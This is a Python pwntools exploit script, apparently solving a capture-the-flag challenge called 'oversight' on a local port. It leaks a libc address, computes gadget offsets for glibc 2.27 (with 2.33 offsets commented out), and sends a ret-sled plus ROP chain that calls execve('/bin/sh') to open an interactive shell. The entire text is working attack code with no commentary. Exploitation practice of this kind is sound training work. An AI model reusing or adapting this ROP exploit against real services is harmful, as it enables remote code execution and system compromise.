from pwn import *

# p = process("./challenge/oversight")
p = remote("localhost", 1337)

p.sendline(b"")
p.readuntil(b"Pick a number: ")
p.sendline(b"17")

p.readuntil(b"Your magic number is: ")
leaked = int(p.readline().strip(), 16)

# 2.27
libc_base = leaked - 0x3ec760
libc_ret = libc_base + 0x000008aa
libc_pop_rsi = libc_base + 0x00023eea
libc_binsh = libc_base + 0x1b3e1a
libc_pop_rdi = libc_base + 0x000215bf
libc_execve = libc_base + 0xe4c00

# # 2.33
# libc_base = leaked - 0x1c1520
# libc_ret = libc_base + 0x00026697
# libc_pop_rsi = libc_base + 0x0002978f
# libc_binsh = libc_base + 0x18bb62
# libc_pop_rdi = libc_base + 0x00027f75
# libc_execve = libc_base + 0xcbf60

print("_IO_2_1_stdout_ = {:x}".format(leaked))
print("libc_base = {:x}".format(libc_base))

p.readuntil(b"How many bytes do you want to read (max 256)? ")
p.sendline(b"256")

ropchain = (
    p64(libc_pop_rsi) +
    p64(0) +  # rsi
    p64(libc_pop_rdi) +
    p64(libc_binsh) +  # /bin/sh
    p64(libc_execve)
)

payload = p64(libc_ret) * ((256 - len(ropchain)) // 8) + ropchain

p.send(payload)

p.interactive()
